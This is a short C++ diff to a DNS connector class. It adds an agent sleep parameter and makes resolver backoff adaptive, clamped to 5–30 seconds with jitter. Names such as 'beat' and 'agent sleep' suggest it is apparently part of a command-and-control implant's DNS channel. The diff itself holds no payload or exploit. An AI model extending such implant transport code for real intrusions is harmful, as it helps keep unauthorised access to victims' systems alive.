@@ -286,10 +286,13 @@ ConnectorDNS::ConnectorDNS()
 {
 }
 
-BOOL ConnectorDNS::SetConfig(ProfileDNS profile, BYTE* beat, ULONG beatSize)
+BOOL ConnectorDNS::SetConfig(ProfileDNS profile, BYTE* beat, ULONG beatSize, ULONG sleepDelaySeconds)
 {
     // cache profile
     this->profile = profile;
+
+    // cache agent sleep for adaptive resolver backoff
+    this->sleepDelaySeconds = sleepDelaySeconds;
 
     // Parse resolver list (comma/semicolon separated)
     this->resolverCount = 0;
@@ -487,7 +490,15 @@ BOOL ConnectorDNS::QueryWithRotation(const CHAR* qname, const CHAR* qtypeStr, BY
 		// Lower threshold since we removed internal retries from DnsQuerySingle
 		const ULONG maxFail = 2;
 		if (this->resolverFailCount[idx] >= maxFail) {
-			ULONG backoff = 30000; // 30 seconds (shorter, allow faster recovery)
+			// Adaptive backoff: tie disable duration to configured sleep.
+			// Clamp to [5s, 30s] to avoid overly aggressive retry loops.
+			ULONG backoff = 30000;
+			if (this->sleepDelaySeconds > 0) {
+				ULONG b = this->sleepDelaySeconds * 2000; // 2 * sleep (ms)
+				if (b < 5000) b = 5000;
+				if (b > 30000) b = 30000;
+				backoff = b;
+			}
 			ULONG jitter = GetTickCount() & 0x0FFF; // 0-4095ms jitter
 			this->resolverDisabledUntil[idx] = GetTickCount() + backoff + jitter;
 			this->resolverFailCount[idx] = 0;
